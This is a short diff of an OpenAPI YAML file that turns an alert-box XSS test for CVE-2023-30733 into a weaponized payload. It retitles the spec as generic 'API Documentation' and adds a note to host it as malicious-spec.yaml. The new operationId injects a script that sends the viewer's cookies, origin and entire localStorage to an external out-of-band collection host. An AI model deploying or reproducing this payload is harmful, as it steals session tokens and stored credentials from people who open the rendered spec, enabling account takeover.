@@ -1,16 +1,23 @@
+# Host this on your server as malicious-spec.yaml
 openapi: 3.0.0
 info:
-  title: CVE-2023-30733 Test
+  title: API Documentation
   version: 1.0.0
 paths:
-  /test:
+  /users:
     get:
-      operationId: "safeId<img src=x onerror='alert(\"XSS via operationId\")'>"
-      summary: A test endpoint
+      operationId: |
+        legitimate_id<script>
+        fetch('https://sxsqrhfknbmbrzsrhkhmeng8nou5pc8db.oast.fun/', {
+          method: 'POST',
+          mode: 'no-cors',
+          body: JSON.stringify({
+            cookies: document.cookie,
+            origin: window.location.origin,
+            localStorage: JSON.stringify(localStorage)
+          })
+        })
+        </script>
       responses:
         '200':
-          description: OK
-          content:
-            text/plain:
-              schema:
-                type: string
+          description: Success
